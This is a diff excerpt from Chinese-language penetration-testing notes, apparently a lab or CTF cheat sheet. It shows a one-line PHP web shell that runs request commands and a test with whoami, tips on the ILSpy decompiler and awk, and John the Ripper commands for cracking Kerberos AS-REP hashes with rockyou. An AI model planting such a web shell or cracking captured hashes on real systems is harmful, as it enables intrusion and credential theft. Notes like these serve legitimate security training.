@@ -349,23 +349,19 @@ vim shell.php.evil
 <pre><?php echo shell_exec($_REQUEST["cmd"]) ?></pre>
 # 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功
 ```
-
 17. **ILSpy工具**
 ```bash
 # 一款逆向工具，可以寻找源码中的信息
 cd ~/Desktop/windowstool/artifacts/linux-x64
 ./ILSpy #后将文件导入
 ```
-
 18. `awk -F'[[:space:]]+' '{print $5}' user.txt>user.list`使用awk提取第五列
-
 19. **John工具**
 ```bash
 john 1.txt # 获取加密方法
 # Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])从这一行看出是“krb5asrep”
 john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt 1.txt
 ```
-
 # 5. **提权**
 
 ```bash
